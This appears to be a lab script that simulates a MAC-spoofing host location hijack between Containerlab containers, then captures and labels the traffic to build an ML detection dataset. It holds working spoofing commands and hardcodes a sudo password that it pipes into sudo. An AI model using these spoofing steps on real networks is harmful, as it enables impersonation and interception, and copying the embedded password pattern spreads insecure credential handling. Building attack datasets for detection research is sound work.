#!/bin/bash
# Simulate Host Location Hijack (MAC Spoofing) Attack
# Includes lab deploy + traffic capture + labeling + detection + cleanup

set -e

############################################
# Variables
############################################
SUDO_PASS="mbpd"
TOPOLOGY_PATH="/mnt/c/Users/mbpd1/Downloads/SDN-ML/complex_topology.clab.yml"

BASE_DIR="/mnt/c/Users/mbpd1/Downloads/SDN-ML"
PCAP_DIR="${BASE_DIR}/pcaps"
LABEL_DIR="${BASE_DIR}/labels"

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
PCAP_FILE="${PCAP_DIR}/host_hijack_${TIMESTAMP}.pcap"
CSV_LABEL="${LABEL_DIR}/labels_${TIMESTAMP}.csv"
JSON_LABEL="${LABEL_DIR}/labels_${TIMESTAMP}.json"
FLOW_SNAPSHOT="${LABEL_DIR}/flows_${TIMESTAMP}.json"
SWITCH_SNAPSHOT="${LABEL_DIR}/switches_${TIMESTAMP}.json"
ALERT_LOG="${LABEL_DIR}/alerts.log"

FLOODLIGHT_URL="http://localhost:8080"
TCPDUMP_PID=""
SIMULATION_DURATION=1200   # 20 minutes (seconds)
PING_INTERVAL=5            # seconds
END_TIME=$((SECONDS + SIMULATION_DURATION))


mkdir -p "${PCAP_DIR}" "${LABEL_DIR}"

############################################
# Cleanup handler (ADDED – does not remove code)
############################################
cleanup() {
    echo
    echo "============================================"
    echo " Cleanup: stopping capture & destroying lab"
    echo "============================================"

    if [[ -n "${TCPDUMP_PID}" ]] && ps -p "${TCPDUMP_PID}" >/dev/null 2>&1; then
        echo "[*] Stopping tcpdump"
        echo "${SUDO_PASS}" | sudo -S kill "${TCPDUMP_PID}" || true
    fi

    echo "[*] Destroying Containerlab topology"
    echo "${SUDO_PASS}" | sudo -S containerlab destroy -t "${TOPOLOGY_PATH}" || true

    echo "[✓] Cleanup complete"
}
trap cleanup EXIT INT TERM

############################################
# Deploy Containerlab topology
############################################
echo "============================================"
echo " Deploying Containerlab Topology"
echo "============================================"

echo "${SUDO_PASS}" | sudo -S containerlab deploy -t "${TOPOLOGY_PATH}"

echo
echo "[✓] Topology deployed successfully"
echo

############################################
# Auto-detect Containerlab prefix
############################################
LAB_PREFIX=$(docker ps --format '{{.Names}}' | grep -E 'clab-.*-h1$' | sed 's/-h1$//')

if [[ -z "$LAB_PREFIX" ]]; then
    echo "ERROR: Could not auto-detect Containerlab prefix"
    exit 1
fi

H1_CONTAINER="${LAB_PREFIX}-h1"
H2_CONTAINER="${LAB_PREFIX}-h2"
H4_CONTAINER="${LAB_PREFIX}-h4"

############################################
# Header
############################################
echo "============================================"
echo " Simulating Host Location Hijack Attack"
echo "============================================"
echo "Lab Prefix: ${LAB_PREFIX}"
echo "Attacker  : h4"
echo "Victim    : h1"
echo

############################################
# Sanity checks
############################################
for c in "$H1_CONTAINER" "$H2_CONTAINER" "$H4_CONTAINER"; do
    if ! docker ps --format '{{.Names}}' | grep -q "^${c}$"; then
        echo "ERROR: Container ${c} is not running"
        exit 1
    fi
done

############################################
# Auto-detect network interface on h1
############################################
INTERFACE=$(docker exec "$H1_CONTAINER" sh -c "ls /sys/class/net | grep -v lo | head -n 1")

if [[ -z "$INTERFACE" ]]; then
    echo "ERROR: Could not detect network interface on h1"
    exit 1
fi

echo "[*] Using interface: ${INTERFACE}"
echo

############################################
# Start packet capture (Wireshark compatible)
############################################
echo "============================================"
echo " Starting Packet Capture"
echo "============================================"
echo "[*] Capture file: ${PCAP_FILE}"

echo "${SUDO_PASS}" | sudo -S tcpdump -i any -w "${PCAP_FILE}" >/dev/null 2>&1 &
TCPDUMP_PID=$!

sleep 3

############################################
# Fetch h1 MAC address
############################################
echo "[*] Fetching MAC address of h1..."
H1_MAC=$(docker exec "$H1_CONTAINER" cat /sys/class/net/${INTERFACE}/address)

if [[ -z "$H1_MAC" ]]; then
    echo "ERROR: Failed to retrieve h1 MAC address"
    exit 1
fi

echo "[+] h1 MAC address: ${H1_MAC}"
echo

############################################
# Determine attack target IP (h2)
############################################
TARGET_IP=$(docker exec "$H2_CONTAINER" ip -4 addr show ${INTERFACE} \
  | awk '/inet / {print $2}' | cut -d/ -f1)

if [[ -z "$TARGET_IP" ]]; then
    echo "ERROR: Could not determine target IP (h2)"
    exit 1
fi

echo "[*] Using attack target IP: ${TARGET_IP}"
echo

############################################
# Attack phase: MAC spoofing
############################################
echo "[*] Launching MAC spoofing attack from h4..."

docker exec "$H4_CONTAINER" ip link set ${INTERFACE} down
docker exec "$H4_CONTAINER" ip link set ${INTERFACE} address ${H1_MAC}
docker exec "$H4_CONTAINER" ip link set ${INTERFACE} up

docker exec "$H4_CONTAINER" ip neigh flush all

echo "[+] h4 is now impersonating h1"
docker exec "$H4_CONTAINER" ip addr show ${INTERFACE}
echo

############################################
# Automatic labeling (CSV + JSON)
############################################
echo "[*] Writing label files..."

cat <<EOF > "${CSV_LABEL}"
timestamp,attack_type,lab_prefix,attacker,victim,spoofed_mac,target_ip
${TIMESTAMP},host_location_hijack,${LAB_PREFIX},h4,h1,${H1_MAC},${TARGET_IP}
EOF

cat <<EOF > "${JSON_LABEL}"
{
  "timestamp": "${TIMESTAMP}",
  "attack_type": "host_location_hijack",
  "lab_prefix": "${LAB_PREFIX}",
  "attacker": "h4",
  "victim": "h1",
  "spoofed_mac": "${H1_MAC}",
  "target_ip": "${TARGET_IP}"
}
EOF

echo "[✓] Labels saved"
echo

############################################
# Real-time detection (MAC flapping)
############################################
echo "============================================"
echo " Real-Time Hijack Detection"
echo "============================================"

H1_MAC_LOC=$(docker exec "$H1_CONTAINER" ip addr show ${INTERFACE} | grep ether || true)
H4_MAC_LOC=$(docker exec "$H4_CONTAINER" ip addr show ${INTERFACE} | grep ether || true)

if [[ "$H1_MAC_LOC" == "$H4_MAC_LOC" ]]; then
    echo "[ALERT] Host Location Hijack Detected!"
    echo "${TIMESTAMP},DETECTED,${H1_MAC},${LAB_PREFIX}" >> "${ALERT_LOG}"
else
    echo "[OK] No hijack detected"
fi

echo

############################################
# Generate attack traffic
############################################
echo "[*] Generating attack traffic toward ${TARGET_IP}..."

echo "[*] Running attack traffic for 20 minutes..."

COUNT=1
while [ $SECONDS -lt $END_TIME ]; do
    echo "  -> Attack iteration ${COUNT}"
    docker exec "$H4_CONTAINER" ping -c 3 ${TARGET_IP} || true
    sleep ${PING_INTERVAL}
    COUNT=$((COUNT + 1))
done


echo
echo "[✓] Attack traffic complete!"
echo

############################################
# Scrape Floodlight flow tables (FIXED: timeout)
############################################
echo "============================================"
echo " Scraping Floodlight Controller Data"
echo "============================================"

curl -m 3 -s "${FLOODLIGHT_URL}/wm/core/controller/switches/json" > "${SWITCH_SNAPSHOT}" || true
curl -m 3 -s "${FLOODLIGHT_URL}/wm/staticflowpusher/list/all/json" > "${FLOW_SNAPSHOT}" || true

echo "[✓] Floodlight snapshots saved"
echo

############################################
# Stop packet capture (kept)
############################################
echo "============================================"
echo " Stopping Packet Capture"
echo "============================================"

echo "${SUDO_PASS}" | sudo -S kill ${TCPDUMP_PID}
sleep 2

echo "[✓] Packet capture saved to:"
echo "    ${PCAP_FILE}"
echo

############################################
# Destroy Containerlab topology (kept)
############################################
echo "============================================"
echo " Destroying Containerlab Topology"
echo "============================================"

echo "${SUDO_PASS}" | sudo -S containerlab destroy -t "${TOPOLOGY_PATH}"

echo
echo "[✓] Topology destroyed successfully"
echo "============================================"
